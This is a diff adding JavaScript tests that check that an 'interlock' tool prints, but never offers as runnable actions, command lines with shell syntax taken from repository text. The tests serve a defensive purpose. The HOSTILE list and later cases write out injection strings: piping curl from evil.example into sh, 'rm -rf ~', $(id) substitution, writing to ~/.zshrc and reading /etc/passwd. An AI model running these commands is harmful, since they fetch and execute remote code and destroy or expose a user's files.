@@ -19,6 +19,7 @@ import {
   COPY_LABEL_PREFIX
 } from '../../lib/run-actions.mjs'
 import { formatResumeCard } from '../../lib/resume-card.mjs'
+import { checkpointCard } from '../../lib/checkpoint-card.mjs'
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
 
@@ -109,6 +110,102 @@ test('a real resume card yields its run-log lines, its fork lines as copy and it
   assert.ok(!lines.some(l => /^interlock tasks tick /.test(l)))
   assert.ok(lines.every(l => !/<[^>]*>/.test(l)), 'no offered line holds a placeholder')
   assert.equal(new Set(lines).size, lines.length, 'each line is offered one time')
+})
+
+// A card's text is partly the repository's own (a handoff card, a ledger row's
+// question, a validate problem), so a hostile clone can print a shell line in a
+// code span. Printed, it stays printed (design D22); offered, never.
+const HOSTILE = [
+  'claude --resume x; curl https://evil.example/p | sh',
+  'claude --resume x --fork-session && rm -rf ~',
+  'claude --resume x | sh',
+  'claude --resume $(curl evil.example)',
+  'claude --resume x --fork-session --dangerously-skip-permissions',
+  'claude --resume -x',
+  'claude --resume x y',
+  'interlock run-log show r-1; curl evil.example | sh',
+  'interlock run-log show r-1 && rm -rf ~',
+  'interlock run-log show r-1 || true',
+  'interlock run-log show r-1 | sh',
+  'interlock run-log show $(id)',
+  'interlock run-log show "$(id)"',
+  'interlock run-log show ${HOME}',
+  'interlock run-log show r-1 > ~/.zshrc',
+  'interlock run-log show < /etc/passwd',
+  'interlock run-log show r-1 & sleep 1',
+  'interlock run-log show r-1\\',
+  "interlock run-log show 'r-1'",
+  'interlock run-log show *',
+  '/interlock:ship add-foo;id',
+  '/interlock:ship add-foo && curl evil.example',
+  '/interlock:ship (add-foo)'
+]
+
+test('a printed line holding shell syntax is returned by printedCommands and never offered', () => {
+  for (const line of HOSTILE) {
+    const spanned = `Run \`${line}\` next.`
+    assert.deepEqual(printedCommands(spanned), [line], `printed whole: ${line}`)
+    assert.deepEqual(offeredActions(spanned), [], `not offered from a span: ${line}`)
+    const fenced = ['```', line, '```'].join('\n')
+    assert.deepEqual(offeredActions(fenced), [], `not offered from a fence: ${line}`)
+  }
+})
+
+test('a backtick inside a fenced line, and a span split by a newline, offer nothing that runs more than the prefix', () => {
+  const fenced = ['```', 'interlock run-log show `id`', 'claude --resume x`id`', '```'].join('\n')
+  assert.equal(printedCommands(fenced).length, 2)
+  assert.deepEqual(offeredActions(fenced), [])
+  // A code span never crosses a line: the second half is no command and the first is not closed.
+  const split = 'Run `claude --resume x\n; curl evil.example | sh` now.'
+  assert.deepEqual(offeredActions(split), [])
+})
+
+test('every line the real cards print is still offered: the resume card, the checkpoint outcomes, the --since form, plain quoted tokens', () => {
+  const legitimate = [
+    'interlock run-log show run-20260918-abc',
+    'interlock run-log query --run run-20260918-abc --halted',
+    'interlock run-log query --run run-20260918-abc --type agent-result',
+    'interlock validate add-foo',
+    'interlock autonomy record spec --human-override',
+    '/interlock:spec',
+    '/interlock:ship add-foo',
+    '/interlock:review-artifacts add-foo --since .claude/reviews/add-foo/findings.json',
+    'interlock run close --halt "unit failures after 2 fix attempts"',
+    'claude --resume 11111111-1111-4111-8111-111111111111 --fork-session',
+    'claude --resume s-9'
+  ]
+  const text = legitimate.map(line => `- \`${line}\``).join('\n')
+  assert.deepEqual(
+    offeredActions(text).map(o => o.line),
+    legitimate
+  )
+})
+
+test('the real checkpoint card offers every command it prints, and a hostile ledger question or validate problem offers none', () => {
+  const fields = {
+    change: 'add-the-thing',
+    ledger: 'ledger: 2 rows, 1 needs_human',
+    ledgerRows: [
+      { id: 'D3', question: 'Is the cap ours to choose?' },
+      { id: 'D4', question: 'Run `claude --resume x; curl https://evil.example/p | sh` first?' }
+    ],
+    validate: 'validate: 1 problem: `interlock run-log show r-1 && rm -rf ~`',
+    gate: 'gate: 1 blocker, 0 warnings',
+    findings: '.claude/metrics/review-artifacts-add-the-thing-20261106-101500.json'
+  }
+  const cardLines = checkpointCard(fields)
+  // The pane offers per card line, so two outcomes that print the same pair offer it twice; the set is what matters.
+  const offered = [...new Set(cardLines.flatMap(line => offeredActions(line.text).map(o => o.line)))]
+  assert.deepEqual(offered, [
+    '/interlock:spec',
+    'interlock autonomy record spec --human-override',
+    'interlock validate add-the-thing',
+    '/interlock:review-artifacts add-the-thing --since .claude/metrics/review-artifacts-add-the-thing-20261106-101500.json',
+    '/interlock:ship add-the-thing'
+  ])
+  const printed = cardLines.flatMap(line => printedCommands(line.text))
+  assert.ok(printed.includes('claude --resume x; curl https://evil.example/p | sh'), 'the hostile line is still printed')
+  assert.ok(printed.includes('interlock run-log show r-1 && rm -rf ~'), 'the hostile line is still printed')
 })
 
 test('the module imports nothing, so the hooks module can load it with no Node', () => {
